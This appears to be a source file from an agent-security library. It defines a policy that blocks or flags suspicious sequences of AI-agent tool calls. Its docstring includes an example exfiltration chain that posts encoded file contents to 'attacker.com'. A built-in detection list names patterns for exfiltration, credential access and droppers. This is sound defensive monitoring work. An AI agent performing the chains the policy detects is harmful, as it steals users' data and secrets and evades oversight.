"""
SequencePolicy — detects suspicious multi-step tool call sequences.

Some attacks don't trigger on a single action — they work by chaining
legitimate-looking tool calls into a harmful sequence.

Example attack chain:
  1. read_file("q3_report.pdf")       ← looks normal
  2. encode_base64(file_contents)     ← suspicious
  3. http_post("attacker.com", data)  ← exfiltration

SequencePolicy tracks tool call history within a session and fires
when a known-malicious sequence is detected.
"""

from __future__ import annotations

import logging
from collections import deque
from dataclasses import dataclass, field
from typing import Optional

from snowmarten.policy_engine.policies.base import BasePolicy
from snowmarten.types import Action, AgentContext, PolicyDecision

logger = logging.getLogger("snowmarten.policy.sequence")


# ── Built-in suspicious sequences ─────────────────────────────────────────────

# Format: list of (tool_name_fragment, within_n_turns)
# If tools A then B happen within N turns → alert/block

DEFAULT_SUSPICIOUS_SEQUENCES: list[dict] = [
    # Exfiltration pattern: read file → send externally
    {
        "name":        "file_read_then_exfil",
        "sequence":    ["read_file", "http"],
        "within_turns": 3,
        "severity":    0.90,
        "description": "File read followed by HTTP call — possible exfiltration",
    },
    # Encode then exfil
    {
        "name":        "encode_then_exfil",
        "sequence":    ["base64", "http"],
        "within_turns": 2,
        "severity":    0.95,
        "description": "Data encoding followed by HTTP call — likely exfiltration",
    },
    # Database dump then exfil
    {
        "name":        "db_dump_then_exfil",
        "sequence":    ["database", "http"],
        "within_turns": 3,
        "severity":    0.90,
        "description": "Database query followed by HTTP call",
    },
    # List files then read many
    {
        "name":        "mass_file_read",
        "sequence":    ["list_files", "read_file", "read_file"],
        "within_turns": 5,
        "severity":    0.70,
        "description": "File enumeration pattern — possible data staging",
    },
    # Execute code then network call
    {
        "name":        "code_exec_then_network",
        "sequence":    ["execute", "http"],
        "within_turns": 2,
        "severity":    0.85,
        "description": "Code execution followed by network call",
    },
    # Credential access
    {
        "name":        "credential_access",
        "sequence":    ["env", "secret", "credential"],
        "within_turns": 3,
        "severity":    0.95,
        "description": "Multiple credential/secret access attempts",
    },
    # Write then execute (dropper pattern)
    {
        "name":        "write_then_execute",
        "sequence":    ["write_file", "execute"],
        "within_turns": 2,
        "severity":    0.95,
        "description": "File write followed by execution — dropper pattern",
    },
]


@dataclass
class SequencePolicy(BasePolicy):
    """
    Detects suspicious multi-step tool call chains.

    Maintains a sliding window of tool calls per session and
    checks each new call against known malicious sequences.

    Example:
        policy = SequencePolicy(
            window_size=5,
            custom_sequences=[
                {
                    "name": "custom_exfil",
                    "sequence": ["customer_export", "send_email"],
                    "within_turns": 2,
                    "severity": 0.90,
                }
            ]
        )
    """

    name = "sequence_policy"

    window_size:         int   = 10      # How many tool calls to remember
    action:              Action = Action.BLOCK
    use_builtin_sequences: bool = True
    custom_sequences:    list[dict] = field(default_factory=list)

    # Per-session state (not serialized)
    _tool_history: deque = field(
        default_factory=lambda: deque(maxlen=10),
        init=False,
        repr=False,
    )

    def __post_init__(self) -> None:
        self._tool_history = deque(maxlen=self.window_size)
        sequences = []
        if self.use_builtin_sequences:
            sequences.extend(DEFAULT_SUSPICIOUS_SEQUENCES)
        sequences.extend(self.custom_sequences)
        self._sequences = sequences

    def evaluate(self, context: AgentContext) -> PolicyDecision:
        # Only evaluate when there's a pending tool call
        if not context.pending_tool_call:
            return self._allow("No tool call to evaluate")

        tool_name = context.pending_tool_call.name.lower()

        # Add to history BEFORE checking (we want to see if this
        # call completes a suspicious sequence)
        self._tool_history.append(tool_name)

        # Get recent history as list
        recent_tools = list(self._tool_history)

        # Check against all sequences
        for seq_def in self._sequences:
            hit = self._check_sequence(
                recent_tools=recent_tools,
                sequence=seq_def["sequence"],
                within_turns=seq_def.get("within_turns", self.window_size),
            )
            if hit:
                severity    = seq_def.get("severity", 0.80)
                description = seq_def.get("description", seq_def["name"])
                reason = (
                    f"Suspicious tool sequence detected: "
                    f"'{seq_def['name']}' — {description} "
                    f"(history: {recent_tools[-seq_def['within_turns']:]})"
                )
                logger.warning(
                    "[SequencePolicy] %s | severity=%.2f",
                    reason, severity
                )
                if self.action == Action.BLOCK:
                    return self._deny(reason=reason, risk_score=severity)
                return self._alert(reason=reason, risk_score=severity)

        return self._allow(
            reason=f"Tool call '{tool_name}' — no suspicious sequence detected"
        )

    def _check_sequence(
        self,
        recent_tools: list[str],
        sequence:     list[str],
        within_turns: int,
    ) -> bool:
        """
        Check if all items in `sequence` appear in the recent tool history
        within the last `within_turns` calls, in order.
        """
        window = recent_tools[-within_turns:] if within_turns else recent_tools

        seq_idx = 0
        for tool in window:
            if seq_idx >= len(sequence):
                break
            # Substring match (e.g., "http" matches "http_request")
            if sequence[seq_idx].lower() in tool.lower():
                seq_idx += 1

        return seq_idx >= len(sequence)

    def reset_session(self) -> None:
        """Call this when starting a new user session."""
        self._tool_history.clear()
